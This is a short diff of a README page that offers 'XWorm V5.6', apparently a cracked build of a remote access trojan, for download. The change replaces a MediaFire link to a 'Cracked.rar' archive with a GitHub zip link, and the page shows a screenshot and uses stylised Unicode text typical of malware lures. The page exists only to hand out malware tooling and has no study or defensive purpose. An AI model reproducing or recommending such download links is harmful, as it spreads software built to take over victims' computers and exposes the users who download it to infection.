@@ -1,6 +1,6 @@
 # ⚪ XWorm V5.6 [Latest-Cleaned]
 
-# 📁[𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://www.mediafire.com/file/3ikiijnq3pj9nuc/XWorm-5.6+Cracked.rar/file)
+# 📁[𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/bensgaming-dot/Xworm-v5.6/archive/refs/heads/main.zip)
 
 
 ![image](https://i.ibb.co/YBShMxh/sshot-14.png)
